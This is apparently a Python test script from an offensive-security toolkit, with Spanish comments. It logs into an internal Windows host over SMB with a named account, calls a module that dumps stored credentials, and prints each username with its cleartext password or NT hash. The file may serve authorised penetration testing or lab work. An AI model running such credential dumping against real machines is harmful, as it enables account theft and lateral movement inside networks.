# tests/test_mimir.py (mueve test_mimir.py a la raíz del proyecto para probar -> python3 test_mimir.py)

from utils import bifrost
from modules import mimir

PC_IT_IP = "10.100.0.20"

access = bifrost.smb_access(PC_IT_IP, "ithelp", "<REDACTED>", domain="PC-IT")
assert access is not None, "No autentico contra PC_IT (revisa cred/firewall)"

dump = mimir.dump_credentials(access)
print("status:", dump.get("status"))
if dump.get("status") == "error":
    print("error:", dump.get("error"))

for c in dump.get("candidates", []):
    valor = c.secret if c.secret else f"NT:{c.nt_hash}"
    print(f"  {c.username} : {valor}  [{c.source}]")